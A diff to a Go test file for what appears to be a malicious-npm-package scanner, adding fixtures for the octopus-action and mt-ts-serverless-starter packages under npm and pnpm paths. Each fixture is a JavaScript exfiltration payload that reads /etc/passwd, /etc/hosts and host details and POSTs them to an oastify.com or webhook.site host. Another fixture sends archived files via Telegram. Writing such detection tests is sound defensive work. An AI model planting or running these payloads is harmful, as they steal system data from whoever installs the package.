@@ -1894,6 +1894,26 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 			raw:  []byte(`async function backup() { archive.glob("**/*", { cwd: process.cwd(), dot: true }); await telegram.sendDocument(chatId, archive); } function startBackupLoop() { backup(); setInterval(backup, 60 * 60 * 1000); } startBackupLoop();`),
 		},
 		{
+			name: "octopus action npm",
+			rel:  filepath.Join("node_modules", "octopus-action", "index.js"),
+			raw:  []byte(`const payload = { host: os.hostname(), user: os.userInfo(), dns: dns.getServers(), passwd: fs.readFileSync("/etc/passwd"), hosts: fs.readFileSync("/etc/hosts") }; https.request({ hostname: "dfwvktnc563cparn1p88c8051w7ovej3.oastify.com", method: "POST" }).end(JSON.stringify(payload));`),
+		},
+		{
+			name: "octopus action pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "octopus-action@1.0.1", "node_modules", "octopus-action", "index.js"),
+			raw:  []byte(`const payload = { host: os.hostname(), user: os.userInfo(), dns: dns.getServers(), passwd: fs.readFileSync("/etc/passwd"), hosts: fs.readFileSync("/etc/hosts") }; https.request({ hostname: "dfwvktnc563cparn1p88c8051w7ovej3.oastify.com", method: "POST" }).end(JSON.stringify(payload));`),
+		},
+		{
+			name: "mt ts serverless starter npm",
+			rel:  filepath.Join("node_modules", "mt-ts-serverless-starter", "index.js"),
+			raw:  []byte(`const payload = { host: os.hostname(), user: os.userInfo(), dns: dns.getServers(), passwd: fs.readFileSync("/etc/passwd"), hosts: fs.readFileSync("/etc/hosts") }; https.request({ hostname: "e4jw9ucdu7sdebgoqqx919p6qxwoke83.oastify.com", method: "POST" }).end(JSON.stringify(payload));`),
+		},
+		{
+			name: "mt ts serverless starter pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "mt-ts-serverless-starter@1.0.1", "node_modules", "mt-ts-serverless-starter", "index.js"),
+			raw:  []byte(`const payload = { host: os.hostname(), user: os.userInfo(), dns: dns.getServers(), passwd: fs.readFileSync("/etc/passwd"), hosts: fs.readFileSync("/etc/hosts") }; https.request({ hostname: "e4jw9ucdu7sdebgoqqx919p6qxwoke83.oastify.com", method: "POST" }).end(JSON.stringify(payload));`),
+		},
+		{
 			name: "gfe lx watcher npm",
 			rel:  filepath.Join("node_modules", "@gfe", "lx-watcher", "install.js"),
 			raw:  []byte(`const { hostname, userInfo } = require("os"); const https = require("https"); const payload = JSON.stringify({ host: hostname(), user: userInfo().username, cwd: process.cwd() }); https.request({ host: "webhook.site", path: "/df384ffa-1094-4bbf-a202-e8b345b3ed18/gfe", method: "POST" }).end(payload);`),
